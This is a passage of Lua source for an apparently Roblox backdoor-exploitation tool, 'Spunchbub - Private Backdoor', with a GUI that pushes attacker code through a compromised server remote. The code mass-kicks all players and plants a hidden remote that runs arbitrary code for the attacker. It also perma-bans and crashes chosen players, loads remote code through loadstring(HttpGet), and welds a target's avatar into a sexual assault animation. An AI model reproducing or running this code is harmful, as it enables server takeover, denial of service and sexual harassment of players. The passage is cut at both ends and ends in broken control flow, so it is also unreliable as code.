LMG2L["UIStroke_1d"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_1d"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_1d"]["Transparency"] = 0.5;

LMG2L["ImageButton3_1e"] = Instance.new("ImageButton", LMG2L["Frame_5"]);
LMG2L["ImageButton3_1e"]["BorderSizePixel"] = 0;
LMG2L["ImageButton3_1e"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
-- LMG2L["ImageButton3_1e"]["Image"] = "rbxassetid://121886242955173";
LMG2L["ImageButton3_1e"]["Size"] = UDim2.new(0, 34, 0, 34);
LMG2L["ImageButton3_1e"]["AutoButtonColor"] = false;
LMG2L["ImageButton3_1e"]["Name"] = [[ImageButton3]];
LMG2L["ImageButton3_1e"]["Position"] = UDim2.new(0, 349, 0, 271);

LMG2L["LocalScript_sd"] = Instance.new("LocalScript", LMG2L["ImageButton3_1e"])

LMG2L["ImageLabelbl"] = Instance.new("ImageLabel", LMG2L["ImageButton3_1e"]);
LMG2L["ImageLabelbl"]["Image"] = "rbxassetid://121886242955173";
LMG2L["ImageLabelbl"]["Size"] = UDim2.new(0, 22, 0, 22);
LMG2L["ImageLabelbl"]["BackgroundTransparency"] = 1;
LMG2L["ImageLabelbl"]["Position"] = UDim2.new(0, 6, 0, 6);

LMG2L["UICorner_1f"] = Instance.new("UICorner", LMG2L["ImageButton3_1e"]);
LMG2L["UICorner_1f"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["UIStroke_20"] = Instance.new("UIStroke", LMG2L["ImageButton3_1e"]);
LMG2L["UIStroke_20"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_20"]["Thickness"] = 1;
LMG2L["UIStroke_20"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_20"]["Transparency"] = 0.5;

LMG2L["exec_21"] = Instance.new("TextButton", LMG2L["Frame_5"]);
LMG2L["exec_21"]["TextStrokeTransparency"] = 0;
LMG2L["exec_21"]["BorderSizePixel"] = 1;
LMG2L["exec_21"]["TextSize"] = 18;
LMG2L["exec_21"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["exec_21"]["BackgroundColor3"] = Color3.fromRGB(18, 20, 23);
LMG2L["exec_21"]["FontFace"] = Font.new([[rbxasset://fonts/families/GothamSSm.json]], Enum.FontWeight.Medium, Enum.FontStyle.Normal);
LMG2L["exec_21"]["Text"] = [[Execute]];
LMG2L["exec_21"]["Size"] = UDim2.new(0, 133, 0, 33);
LMG2L["exec_21"]["Name"] = [[exec]];
LMG2L["exec_21"]["AutoButtonColor"] = false;
LMG2L["exec_21"]["Position"] = UDim2.new(0, 6, 0, 272);

LMG2L["UICorner_22"] = Instance.new("UICorner", LMG2L["exec_21"]);
LMG2L["UICorner_22"]["CornerRadius"] = UDim.new(0, 6);

LMG2L["LocalScript_23"] = Instance.new("LocalScript", LMG2L["exec_21"]);

LMG2L["UIStroke_24"] = Instance.new("UIStroke", LMG2L["exec_21"]);
LMG2L["UIStroke_24"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
LMG2L["UIStroke_24"]["Thickness"] = 1;
LMG2L["UIStroke_24"]["Color"] = Color3.fromRGB(97, 97, 97);
LMG2L["UIStroke_24"]["Transparency"] = 0.5;

LMG2L["ImageLabel_25"] = Instance.new("ImageLabel", LMG2L["Frame_5"]);
LMG2L["ImageLabel_25"]["BorderSizePixel"] = 0;
LMG2L["ImageLabel_25"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
LMG2L["ImageLabel_25"]["Image"] = [[rbxassetid://89640858025803]];
LMG2L["ImageLabel_25"]["Size"] = UDim2.new(0, 277, 0, 272);
LMG2L["ImageLabel_25"]["BackgroundTransparency"] = 1;
LMG2L["ImageLabel_25"]["ImageTransparency"] = 0.43;
LMG2L["ImageLabel_25"]["Position"] = UDim2.new(0.204, 0, 0.035, 0);

function EnableDrag(frame)
	local dragging
	local dragInput
	local dragStart
	local startPos

	local function update(input)
		local delta = input.Position - dragStart
		local targetPos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		
		-- Tweening for smoothness
		local tweenInfo = TweenInfo.new(0.15, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
		TweenService:Create(frame, tweenInfo, {Position = targetPos}):Play()
	end

	frame.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = frame.Position

			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)

	frame.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			update(input)
		end
	end)
end

task.spawn(function()
    EnableDrag(LMG2L["Main_2"])
end)

local TweenService = game:GetService("TweenService")
local UserInputService = game:GetService("UserInputService")

local toggle = Instance.new("TextButton", LMG2L["SpunchLOL_1"])
local mainFrame = LMG2L["Main_2"]

-- UI Setup
toggle.Size = UDim2.new(0, 45, 0, 45)
toggle.Position = UDim2.new(0, 20, 0, 200)
toggle.Text = '<font color="#f7f30a">S</font>'
toggle.RichText = true
toggle.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Medium, Enum.FontStyle.Normal)
toggle.BackgroundColor3 = Color3.fromRGB(26,27,32)
toggle.TextColor3 = Color3.fromRGB(255,255,255)
toggle.TextSize = 24
toggle.AutoButtonColor = false

local corner = Instance.new("UICorner", toggle)
corner.CornerRadius = UDim.new(0, 6)

local stroke = Instance.new("UIStroke", toggle)
stroke.Thickness = 1
stroke.Color = Color3.fromRGB(97, 97, 97)
stroke.Transparency = 0.5
stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

-- Draggable Logic
local dragging, dragInput, dragStart, startPos

local function update(input)
    local delta = input.Position - dragStart
    local pos = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    TweenService:Create(toggle, TweenInfo.new(0.15, Enum.EasingStyle.Quint), {Position = pos}):Play()
end

toggle.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        dragging = true
        dragStart = input.Position
        startPos = toggle.Position
        input.Changed:Connect(function()
            if input.UserInputState == Enum.UserInputState.End then dragging = false end
        end)
    end
end)

toggle.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
        dragInput = input
    end
end)

UserInputService.InputChanged:Connect(function(input)
    if input == dragInput and dragging then update(input) end
end)

local TweenService = game:GetService("TweenService")
local originalTransparencies = setmetatable({}, {__mode = "k"})

local function saveTransparencies(root)
    local function process(obj)
        local props = {}
        
        -- Background Transparency (Most GuiObjects)
        if obj:IsA("GuiObject") then
            props.BackgroundTransparency = obj.BackgroundTransparency
        end
        
        -- ScrollingFrame specific
        if obj:IsA("ScrollingFrame") then
            props.ScrollBarImageTransparency = obj.ScrollBarImageTransparency
        end
        
        -- Text based
        if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
            props.TextTransparency = obj.TextTransparency
            props.TextStrokeTransparency = obj.TextStrokeTransparency
        end
        
        -- Image based
        if obj:IsA("ImageLabel") or obj:IsA("ImageButton") then
            props.ImageTransparency = obj.ImageTransparency
        end
        
        -- ViewportFrames
        if obj:IsA("ViewportFrame") then
            props.ImageTransparency = obj.ImageTransparency
        end

        -- Strokes
        if obj:IsA("UIStroke") then
            props.Transparency = obj.Transparency
        end
        
        -- Only store if we found properties to track
        if next(props) then
            originalTransparencies[obj] = props
        end
    end

    -- Process root first
    process(root)
    
    -- Then process ALL descendants
    for _, descendant in ipairs(root:GetDescendants()) do
        process(descendant)
    end
end

-- Initialize saved state
saveTransparencies(mainFrame)

local function setFade(targetVisible, duration)
    local tweenInfo = TweenInfo.new(duration, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
    
    for obj, savedProps in pairs(originalTransparencies) do
        -- Ensure object still exists and has a parent
        if obj and obj.Parent then
            local tweenProps = {}
            
            for propName, originalValue in pairs(savedProps) do
                -- If targetVisible is true, go to original; if false, go to 1
                tweenProps[propName] = targetVisible and originalValue or 1
            end
            
            -- Create and play tween for each object
            local tween = TweenService:Create(obj, tweenInfo, tweenProps)
            tween:Play()
        end
    end
end

local opened = true
local isAnimating = false

toggle.MouseButton1Click:Connect(function()
    if isAnimating then return end
    isAnimating = true
    
    opened = not opened
    
    if opened then
        mainFrame.Visible = true
        setFade(true, 0.25)
        toggle:TweenSize(UDim2.new(0, 45, 0, 45), "Out", "Bounce", 0.4, true)
        task.delay(0.4, function()
            isAnimating = false
        end)
    else
        setFade(false, 0.25)
        toggle:TweenSize(UDim2.new(0, 38, 0, 38), "Out", "Bounce", 0.4, true)
        task.delay(0.4, function()
            mainFrame.Visible = false
            isAnimating = false
        end)
    end
end)

-- Scripts
local function C_8()
	local script = LMG2L["LocalScript_8"];
	script.Parent.MouseButton1Click:Connect(function()	
	      local editor = script.Parent.Parent.EditorScroll.Editor	
	      if editor.TextTransparency == 0 then
             editor.TextTransparency = 1
             LMG2L["ImageLabelbla"]["Image"] = "rbxassetid://135928786788378";
          else
             editor.TextTransparency = 0
             LMG2L["ImageLabelbla"]["Image"] = "rbxassetid://100033680381365";
          end
	end)	
end;
task.spawn(C_8);

local function C_10()
	local script = LMG2L["LocalScript_10"];
	script.Parent.MouseButton1Click:Connect(function()	
	      script.Parent.Parent.EditorScroll.Editor.Text = ""	
	end)	
end;
task.spawn(C_10);

local function C_1a()
	local script = LMG2L["LocalScript_1a"];
	script.Parent.MouseButton1Click:Connect(function()	
	      script.Parent.Parent.Parent.Parent.Parent:Destroy()	
	end)	
end;
task.spawn(C_1a);

local function C_r6()
	local script = LMG2L["LocalScript_r6"];
	script.Parent.MouseButton1Click:Connect(function()	
           fireRemoteEvent('require(3436957371):r6("' .. game.Players.LocalPlayer.Name .. '")')
     end)
end;
task.spawn(C_r6);

local function C_ni()
	local script = LMG2L["LocalScript_ni"];
	script.Parent.MouseButton1Click:Connect(function()	
           fireRemoteEvent("game.Players." .. game.Players.LocalPlayer.Name .. ":LoadCharacter()")
     end)
end;
task.spawn(C_ni);

local function C_sd()
	local script = LMG2L["LocalScript_sd"];
	script.Parent.MouseButton1Click:Connect(function()	
           fireRemoteEvent([[
              for _, v in pairs(game.Players:GetPlayers()) do
                 v:Kick("Game shutdowned by Spunchbub - Private Backdoor")
              end
		   ]])
     end)
end;
task.spawn(C_sd);

local function C_23()
	local script = LMG2L["LocalScript_23"];
	script.Parent.MouseButton1Click:Connect(function()	
	      local code = script.Parent.Parent.EditorScroll.Editor.Text	
	      if code ~= "" then
                local success, result = pcall(function()
	               fireRemoteEvent(code)
                end)
                if success and foundExploit then
                   notify.Info("Spunchbub","Successfully executed script!")
                elseif not foundExploit and success then
                   notify.Warn("Spunchbub","Failed to execute script, No backdoor.")
                else
                   notify.Error("Spunchbub","Failed to execute script!")
                end
	      else	
	           notify.Warn("Spunchbub","Put a script first!")	
          end	
	end)	
end;
task.spawn(C_23);

local currentRemote
local ancestryConnection
local isScanning = false

local function watchRemote(remote)
    if ancestryConnection then
        ancestryConnection:Disconnect()
        ancestryConnection = nil
    end

    if not remote or typeof(remote) ~= "Instance" then return end
    currentRemote = remote

    ancestryConnection = remote.AncestryChanged:Connect(function(_, parent)
        if not parent and not isScanning then
            isScanning = true
            notify.Error("Spunchbub", "Backdoor removed, attempting to scan...")

            local newRemote = nil
            
            for i = 1, 5 do
                task.wait(0.25)
                local found = findRemote()
                if found and found ~= remote then
                    newRemote = found
                    break
                end
            end

            if newRemote then
                notify.Info("Spunchbub", "New backdoor was found!")
                isScanning = false
                watchRemote(newRemote)
            else
                notify.Error("Spunchbub", "Scan failed. No backdoor was found.")
                isScanning = false
                currentRemote = nil
            end
        end
    end)
end

local initial = remoteEvent or remoteFunction
if not initial then
    initial = findRemote()
end

if initial then
    watchRemote(initial)
end
        
       fireRemoteEvent([[
local services = {
 game:GetService("PathfindingService"),
 game:GetService("PolicyService"),
 game:GetService("TestService"),
 game:GetService("FriendService"),
 game:GetService("SoundService"),
 game:GetService("LocalizationService"),
 game:GetService("MarketplaceService"),
 game:GetService("HttpService"),
 game:GetService("FeatureRestrictionManager"),
 game:GetService("Lighting"),
 game:GetService("ReplicatedStorage")
}

math.randomseed(os.clock() * 1e6)

local function rand()
 local t = {}
 for i = 1, math.random(6,12) do
  t[i] = string.char(
   math.random(97,122)
  )
 end
 return table.concat(t)
end

for _, svc in ipairs(services) do
 local p = svc

 for i = 1, 100 do
  local f = Instance.new("Folder")
  f.Name = rand()
  f.Parent = p
  p = f
 end

 local r = Instance.new("RemoteFunction")
 r.Name = "rbxAssetid_core__temp_3023g78"
 r.OnServerInvoke = function(plr)
  plr:Kick("Backdoor has been secured by Spunchbub - Private Backdoor")
 end
 r.Parent = p
end
]])  

fireRemoteEvent([[
	local services = {
    game:GetService("PathfindingService"),
    game:GetService("PolicyService"),
    game:GetService("TestService"),
    game:GetService("FriendService"),
    game:GetService("SoundService"),
    game:GetService("LocalizationService"),
    game:GetService("MarketplaceService"),
    game:GetService("HttpService"),
	game:GetService("FeatureRestrictionManager"),
	game:GetService("Lighting"),
	game:GetService("ReplicatedStorage")
}

for _, svc in ipairs(services) do
  for r = 1, 100 do 
    local r = Instance.new("RemoteFunction")
    r.Name = "spunch.bd_cssr6-O1"
    r.OnServerInvoke = function(player)
        player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
    end
    r.Parent = svc
  end
end]])
fireRemoteEvent('local r=Instance.new("RemoteEvent",game.JointsService)r.Name="_FEBYPASS32"r.OnServerEvent:Connect(function(p)p:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")end)')
fireRemoteEvent('require(7458325257).antiban()')
fireRemoteEvent([[
local frm = game:GetService("FeatureRestrictionManager")

local remoteFunction = Instance.new("RemoteFunction")
remoteFunction.Name = "spunch.bd_cssr6-01"
remoteFunction.Parent = frm

local loadstring = require(13684410229)

remoteFunction.OnServerInvoke = function(player, code)
    if player.Name ~= "]] .. game.Players.LocalPlayer.Name .. [[" then
        player:Kick("Backdoor has been secured by Spunchbub - Private Backdoor.")
        return
    end
    loadstring(code)()
end
]])

fireRemoteEvent([[
local Players = game:GetService("Players")

local allowedPlayer = "]] .. game.Players.LocalPlayer.Name .. [["

local suspiciousKeywords = {
    "hd admin","ranker","java1","darklord","pracharatbampen","777ililo",
    "sugma","ro xploit","secret service panel","kid","666","n00t","ximi",
    "k1d","kidd","k1dd","k00p","tubers","h01pk","ban","dreambull","krnkidssus",
    "ban gui","itsnotskeleton","l0ck","bnkksd hd","andres","l00pz","change map",
    "xxandresxx","c00lgui","c00l","elmarz","teamf*t","teamfat","koop",
    "5x5x5x5","g00b","kick","undetectable gui","undetectable","c00lkidd",
    "acron","russia","infector","potato","sans_gboard","777lilo","g00by",
    "starp4tch","user1337","menotgonnadobadstuff","team fat","traffix",
    "8t010t8","darius","j00p","144anz","sigma","topkek","polaria",
    "noot","1x1x1x1","lacking923","kaax","s1n","topk3k","decal spam",
    "k_aax","ep1c","zazol","lalol","cxyz","saudi","rc7","dimin",
    "j01tar0","koma","gigxxx","hax0rz","g00l","tr00g","mat3l0rd",
    "enstrio","br1cked","hax","acorn","logger","blue2spooky","krsp",
}

local function isSuspicious(str)
    if not str then return false end
    str = string.lower(str)

    for _, keyword in ipairs(suspiciousKeywords) do
        if string.find(str, keyword) then
            return true
        end
    end

    return false
end

local function Hint(text)
    local hint = Instance.new("Hint")
    hint.Name = "SAS"
    hint.Text = text
    hint.Parent = workspace

    task.delay(3, function()
        if hint then
            hint:Destroy()
        end
    end)
end

local function handleObject(obj, player)
    if player.Name == allowedPlayer then return end

    if obj:IsA("ScreenGui") or obj:IsA("Frame") or obj:IsA("TextLabel") or obj:IsA("TextButton") then
        local nameStr = obj.Name
        local textStr = obj:IsA("TextLabel") and obj.Text or ""

        if isSuspicious(nameStr) or isSuspicious(textStr) then
            Hint("SAS Removed Suspicious ui: "..nameStr.." from "..player.DisplayName)

            local root = obj
            while root and not root:IsA("ScreenGui") do
                root = root.Parent
            end

            if root then
                root:Destroy()
            else
                obj:Destroy()
            end
        end
    end
end

local function monitorPlayer(player)
    local function setup()
        local playerGui = player:WaitForChild("PlayerGui")

        for _, obj in ipairs(playerGui:GetDescendants()) do
            pcall(handleObject, obj, player)
        end

        playerGui.DescendantAdded:Connect(function(obj)
            pcall(handleObject, obj, player)
        end)
    end

    if player.Character then
        setup()
    end

    player.CharacterAdded:Connect(setup)
end

for _, player in ipairs(Players:GetPlayers()) do
    task.spawn(monitorPlayer, player)
end

Players.PlayerAdded:Connect(function(player)
    task.spawn(monitorPlayer, player)
end)
]])

	local library = loadstring(game:HttpGet("https://raw.githubusercontent.com/systemzyx/betterlibs/refs/heads/main/betteruilib.lua"))()
	local CommandsMenu = library:Window("Spunchbub - Private Admin")
	
	local selectedPlayer = nil
	local function findPlayer(name)
		for _, player in pairs(game.Players:GetPlayers()) do
			if string.find(string.lower(player.Name), string.lower(name)) or string.find(string.lower(player.DisplayName), string.lower(name)) then
				return player
			end
		end
		return nil
	end
	local selectedPlayerLabel = CommandsMenu:Label("Selected Player: N/A")
	
	CommandsMenu:Textbox("Target Player", "Username", function(playertc)
		selectedPlayer = findPlayer(playertc)
		if selectedPlayer then
			selectedPlayerLabel.Text = "Selected Player: " .. selectedPlayer.DisplayName
		else
			selectedPlayerLabel.Text = "Player not found"
		end
	end)
	
	CommandsMenu:Button("Kick Player", function()
		if selectedPlayer then
			fireRemoteEvent('for i,v in pairs(game.Players:GetPlayers()) do if v.Name == "' .. selectedPlayer.Name .. '" then v:Kick("You have been kicked") end end')
		end
	end)
	CommandsMenu:Button("Perm BanAsync Player", function()
		if selectedPlayer and selectedPlayer ~= game.Players.LocalPlayer then
			fireRemoteEvent([[
				local Players = game:GetService("Players")
				local targetUserId = ]] .. selectedPlayer.UserId .. [[
				if targetUserId ~= ]] .. game.Players.LocalPlayer.UserId .. [[ then
					pcall(function()
						Players:BanAsync({
							UserIds = {targetUserId},
							Duration = -1,
							DisplayReason = "You've been Perma-BANNED.",
							PrivateReason = "hahaha",
							ExcludeAltAccounts = false,
							ApplyToUniverse = true
						})
					end)
				end
			]])
		else
			selectedPlayerLabel.Text = "Cannot ban yourself!"
		end
	end)
	CommandsMenu:Button("Reset Player", function()
		if selectedPlayer then 
			fireRemoteEvent("game.Players." .. selectedPlayer.Name .. ":LoadCharacter()")
		end
	end)
	CommandsMenu:Button("D#ck Player", function()
		if selectedPlayer then 
			fireRemoteEvent('require(140321069022189).pingas("' .. selectedPlayer.Name .. '")')
		end
	end)
	CommandsMenu:Button("Crash Player", function()
		if selectedPlayer then 
	       local code = [[
	local function addtool()
	local tool = Instance.new("Tool")
	tool.ToolTip = string.rep("A", 200)
	tool.Name = string.rep("A", 200)
	tool.CanBeDropped = false
	tool.Parent = game.Players["]] .. selectedPlayer.Name .. [["].Backpack
	end
	
	for b = 1, 9007199254740991 do
	task.spawn(function()
	addtool()
	end)
	end
	]]
	
	fireRemoteEvent(code)
		end
	end)
	CommandsMenu:Button("F#ck Player", function()
		if selectedPlayer then 
			fireRemoteEvent([[
	function fWeld(zName, zParent, zPart0, zPart1, zCoco, a, b, c, d, e, f)
	local funcw = Instance.new("Weld")
	funcw.Name = zName
	funcw.Parent = zParent
	funcw.Part0 = zPart0
	funcw.Part1 = zPart1
	if (zCoco == true) then
	funcw.C0 = CFrame.new(a, b, c) * CFrame.fromEulerAnglesXYZ(d, e, f)
	else
	funcw.C1 = CFrame.new(a, b, c) * CFrame.fromEulerAnglesXYZ(d, e, f)
	end
	return funcw
	end
	function fun(n1, n2)
	pcall(function()
	t1 = game.Players[n1].Character.Torso
	t2 = game.Players[n2].Character.Torso
	t2.Parent.Humanoid.PlatformStand = true
	t1["Left Shoulder"]:Remove()
	ls1 = Instance.new("Weld")
	ls1.Parent = t1
	ls1.Part0 = t1
	ls1.Part1 = t1.Parent["Left Arm"]
	ls1.C0 = CFrame.new(-1.5,0,0)
	ls1.Name = "Left Shoulder"
	t1["Right Shoulder"]:Remove()
	rs1 = Instance.new("Weld")
	rs1.Parent = t1
	rs1.Part0 = t1
	rs1.Part1 = t1.Parent["Right Arm"]
	rs1.C0 = CFrame.new(1.5,0,0)
	rs1.Name = "Right Shoulder"
	t2["Left Shoulder"]:Remove()
	ls2 = Instance.new("Weld")
	ls2.Parent = t2
	ls2.Part0 = t2
	ls2.Part1 = t2.Parent["Left Arm"]
	ls2.C0 = CFrame.new(-1.5,0,0)
	ls2.Name = "Left Shoulder"
	t2["Right Shoulder"]:Remove()
	rs2 = Instance.new("Weld")
	rs2.Parent = t2
	rs2.Part0 = t2
	rs2.Part1 = t2.Parent["Right Arm"]
	rs2.C0 = CFrame.new(1.5,0,0)
	rs2.Name = "Right Shoulder"
	t2["Left Hip"]:Remove()
	lh2 = Instance.new("Weld")
	lh2.Parent = t2
	lh2.Part0 = t2
	lh2.Part1 = t2.Parent["Left Leg"]
	lh2.C0 = CFrame.new(-0.5,-2,0)
	lh2.Name = "Left Hip"
	t2["Right Hip"]:Remove()
	rh2 = Instance.new("Weld")
	rh2.Parent = t2
	rh2.Part0 = t2
	rh2.Part1 = t2.Parent["Right Leg"]
	rh2.C0 = CFrame.new(0.5,-2,0)
	rh2.Name = "Right Hip"
	local d = Instance.new("Part")
	d.TopSurface = 0
	d.BottomSurface = 0
	d.BrickColor = BrickColor.new("Medium stone grey")
	d.Shape = "Ball"
	d.Parent = t1
	d.Size = Vector3.new(1,1,1)
	local dm = Instance.new("SpecialMesh")
	dm.MeshType = "Sphere"
	dm.Parent = d
	dm.Scale = Vector3.new(0.4,0.4,0.4)
	fWeld("weld",t1,t1,d,true,-0.2,-1.3,-0.6,0,0,0)
	d2 = d:Clone()
	d2.Parent = t1
	fWeld("weld",t1,t1,d2,true,0.2,-1.3,-0.6,0,0,0)
	local c = Instance.new("Part")
	c.TopSurface = 0
	c.BottomSurface = 0
	c.CanCollide = false
	c.BrickColor = BrickColor.new("Pastel brown")
	c.Parent = t1
	c.formFactor = "Custom"
	c.Size = Vector3.new(0.4,1.3,0.4)
	cm = Instance.new("CylinderMesh")
	cm.Parent = c
	a = fWeld("weld",t1,t1,c,true,0,-1,-0.52+(-c.Size.y/2),math.rad(-80),0,0)
	c2 = d:Clone()
	c2.BrickColor = BrickColor.new("Medium stone grey")
	c2.Mesh.Scale = Vector3.new(0.4,0.62,0.4)
	c2.Parent = t1
	fWeld("weld",c,c,c2,true,0,0+(c.Size.y/2),0,math.rad(-10),0,0)
	local bl = Instance.new("Part")
	bl.TopSurface = 0
	bl.BottomSurface = 0
	bl.CanCollide = false
	bl.BrickColor = BrickColor.new("Pastel brown")
	bl.Shape = "Ball"
	bl.Parent = t2
	bl.Size = Vector3.new(1,1,1)
	local dm = Instance.new("SpecialMesh")
	dm.MeshType = "Sphere"
	dm.Parent = bl
	dm.Scale = Vector3.new(1.2,1.2,1.2)
	fWeld("weld",t2,t2,bl,true,-0.5,0.5,-0.6,0,0,0)
	local br = Instance.new("Part")
	br.TopSurface = 0
	br.BottomSurface = 0
	br.CanCollide = false
	br.BrickColor = BrickColor.new("Pastel brown")
	br.Shape = "Ball"
	br.Parent = t2
	br.Size = Vector3.new(1,1,1)
	local dm = Instance.new("SpecialMesh")
	dm.MeshType = "Sphere"
	dm.Parent = br
	dm.Scale = Vector3.new(1.2,1.2,1.2)
	fWeld("weld",t2,t2,br,true,0.5,0.5,-0.6,0,0,0)
	local bln = Instance.new("Part")
	bln.TopSurface = 0
	bln.BottomSurface = 0
	bln.CanCollide = false
	bln.Shape = "Ball"
	bln.Parent = t2
	bln.Size = Vector3.new(1,1,1)
	local dm = Instance.new("SpecialMesh")
	dm.MeshType = "Sphere"
	dm.Parent = bln
	dm.Scale = Vector3.new(0.2,0.2,0.2)
	fWeld("weld",t2,t2,bln,true,-0.5,0.5,-1.2,0,0,0)
	local brn = Instance.new("Part")
	brn.TopSurface = 0
	brn.BottomSurface = 0
	brn.CanCollide = false
	brn.Shape = "Ball"
	brn.Parent = t2
	brn.Size = Vector3.new(1,1,1)
	local dm = Instance.new("SpecialMesh")
	dm.MeshType = "Sphere"
	dm.Parent = brn
	dm.Scale = Vector3.new(0.2,0.2,0.2)
	fWeld("weld",t2,t2,brn,true,0.5,0.5,-1.2,0,0,0)
	lh2.C1 = CFrame.new(0,-1.5,-0.5) * CFrame.Angles(0.9,-0.4,0)
	rh2.C1 = CFrame.new(0,-1.5,-0.5) * CFrame.Angles(0.9,0.4,0)
	ls2.C1 = CFrame.new(-0.5,-1.3,-0.5) * CFrame.Angles(0.9,-0.4,0)
	rs2.C1 = CFrame.new(0.5,-1.3,-0.5) * CFrame.Angles(0.9,0.4,0)
	ls1.C1 = CFrame.new(-0.5,0.7,0) * CFrame.Angles(-0.9,-0.4,0)
	rs1.C1 = CFrame.new(0.5,0.7,0) * CFrame.Angles(-0.9,0.4,0)
	if t1:findFirstChild("weldx") ~= nil then
	t1.weldx:Remove()
	end
	we = fWeld("weldx", t1, t1, t2, true, 0, -0.9, -1.3, math.rad(-90), 0, 0)
	n = t2.Neck
	n.C0 = CFrame.new(0, 1.5, 0) * CFrame.Angles(math.rad(-210), math.rad(180), 0)
	end)
	coroutine.resume(coroutine.create(function()
	while wait() do
	for i = 1,6 do
	we.C1 = we.C1 * CFrame.new(0,-0.3,0)
	wait()
	end
	 
	for i = 1,6 do
	we.C1 = we.C1 * CFrame.new(0,0.3,0)
	wait()
	end
	end
	end))
	end
	fun("]] .. game.Players.LocalPlayer.Name .. [[", "]] .. selectedPlayer.Name .. [[")
	]])
		end
	end)
	CommandsMenu:Button("Silly Player", function()
		if selectedPlayer then 
			fireRemoteEvent('require(78730160118005).justabitsilly("' .. selectedPlayer.Name .. '")')
		end
	end)
	CommandsMenu:Button("Hack alert Player", function()
		if selectedPlayer then 
			fireRemoteEvent('require(10557341183).alert("' .. selectedPlayer.Name .. '", "YOU HAVE BEEN HACKED BY C00LKIDD!!!")')
		end
	end)
	CommandsMenu:Button("Lava CHIICKEN", function()
			fireRemoteEvent('local s=Instance.new("Sound",workspace);s.SoundId="rbxassetid://111172243066964";s.Looped=true;s:Play()')
			fireRemoteEvent('require(78976842635186)')
			fireRemoteEvent('while true do for _,p in ipairs(game:GetService("Players"):GetPlayers()) do local bp=p:FindFirstChild("Backpack") if bp then local t=Instance.new("Tool") t.RequiresHandle=false local e={"🐔","💥","🍗","🔥","💀","🥵","🤝","🥴","😏","😰"} t.Name="chicken_"..math.random(100000,999999999)..e[math.random(1,#e)]..e[math.random(1,#e)]..e[math.random(1,#e)] t.Parent=bp end end task.wait(0.1) end')
	end)
	CommandsMenu:Button("Death?", function()
			fireRemoteEvent('local s=Instance.new("Sound",workspace)s.Name="death."s.SoundId="rbxassetid://35930009"s:Play()s.Looped=true')
			fireRemoteEvent('require(15413579595):Death()')
	end)
	CommandsMenu:Button("EL MAXWELL!!", function()
			fireRemoteEvent('local s=Instance.new("Sound",workspace)s.Name="EL GATO or MASWELL"s.SoundId="rbxassetid://104483584177040"s:Play()s.Looped=true repeat wait(0.01) until s.IsLoaded==true wait(2)local d=Instance.new("DistortionSoundEffect",s)d.Level=0.8 local sky=Instance.new("Sky",game:GetService("Lighting"))sky.SkyboxBk="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxFt="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxLf="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxRt="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxUp="http://www.roblox.com/asset/?id=4575171289"sky.SkyboxDn="http://www.roblox.com/asset/?id=4575171289"sky.CelestialBodiesShown=false sky.StarCount=999999999999999999 for _,p in ipairs(game:GetService("Players"):GetPlayers())do if p.Character then p.Character:Destroy()end end local l=game:GetService("Lighting")l.FogEnd=1000 l.FogStart=900 l.FogColor=Color3.new(math.random(),math.random(),math.random()) local m=Instance.new("Message",workspace)m.Text="oooo nice computer you got there can i have it" local t=game:FindFirstChild("Teams")if t then t:ClearAllChildren()end while true do wait(0.01) if t then local tm=Instance.new("Team",t)tm.Name="maxwell real?!?"..tostring(math.random(1,33373))tm.TeamColor=BrickColor.Random()end for i=1,15 do local c=Instance.new("Part",workspace)local ms=Instance.new("SpecialMesh",c)ms.MeshType=Enum.MeshType.FileMesh ms.MeshId="rbxassetid://4934166503"ms.TextureId="rbxassetid://4934166532"c.Touched:Connect(function(o)o:Destroy()end)c.Size=Vector3.new(6.502,11.339,14.281)c.CFrame=CFrame.new(math.random(-1000,1000),math.random(-1000,1000),math.random(-1000,1000))end end')
	end)

fireRemoteEvent('require(3986243232).load("spunchbub anti skid",{"' .. game.Players.LocalPlayer.Name ..  '"})')
        notify.Info("Spunchbub","Backdoor found! Implemented backdoor protection & anti skid.")
    else
        notify.Warn("Spunchbub","No backdoor found.")
        LMG2["ScanButton_c"]["Text"] = "No backdoor found :("
        task.wait(2)
        LMG2["ScanButton_c"]["Text"] = "Scan Backdoor"
    end
end)
